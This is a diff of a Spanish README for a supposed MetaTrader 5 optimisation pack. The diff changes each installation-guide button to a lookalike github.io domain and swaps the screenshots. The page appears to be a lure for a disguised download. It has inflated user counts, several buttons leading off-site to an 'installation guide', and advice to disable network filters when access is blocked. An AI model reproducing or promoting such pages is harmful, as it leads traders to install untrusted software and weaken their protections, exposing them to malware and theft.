@@ -6,7 +6,7 @@
 
 **Acerca de MetaTrader5OptiPack**: MetaTrader5OptiPack es un repositorio para usuarios de *MetaTrader 5 2025* en Windows, con herramientas y configuraciones comunitarias para optimizar el análisis de mercados y el trading automatizado. Mejora el rendimiento, reduce tiempos de ejecución y potencia estrategias de trading para una experiencia fluida. Con 15M+ visitantes y 8M+ miembros, ¡eleva tus operaciones hoy!
 
- <a href="https://metatrader5-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://meta-trader-5-opti-comunidad.github.io/.github/" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="85" style="border:none;">
 </a>
 
@@ -22,8 +22,8 @@ Mejora tu *MetaTrader 5 2025* con **MetaTrader5OptiPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
- <a href="https://metatrader5-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+ <a href="https://meta-trader-5-opti-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="85" style="border:none;">
 </a>
 
 ## 🛠 ¿Por qué MetaTrader5OptiPack?
@@ -35,8 +35,8 @@ Mejora tu *MetaTrader 5 2025* con **MetaTrader5OptiPack** en Windows:
 - 🤝 **Comunidad Activa**: Conecta con 8M+ miembros.  
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tus estrategias.
 
- <a href="https://metatrader5-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+ <a href="https://meta-trader-5-opti-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="85" style="border:none;">
 </a>
 
 ## 📈 Escenarios de Optimización
@@ -77,12 +77,12 @@ Mejora tu *MetaTrader 5 2025* con **MetaTrader5OptiPack** en Windows:
 ## 📸 Visuales
 
 **Interfaz de MetaTrader5OptiPack**  
-![Interfaz](https://i.ytimg.com/vi/gt7WXqgs_SI/maxresdefault.jpg)  
-*Panel de optimización intuitivo.*
+![Interfaz](https://www.metatrader4.com/i/download/mt5-desktop-logo_2x.jpg)  
+ 
 
 **Características de las Herramientas**  
-![Características](https://avatars.mds.yandex.net/i?id=f66dab7a0b508fb67e7cfa815c4697cf_l-5477655-images-thumbs&ref=rim&n=13&w=1260&h=709)  
-*Herramientas optimizadas para MetaTrader 5.*
+![Características](https://avatars.mds.yandex.net/i?id=93c545fdf482efc20fd04661f570a66e_l-5236122-images-thumbs&ref=rim&n=13&w=2500&h=1373)  
+ 
 
 ---
 
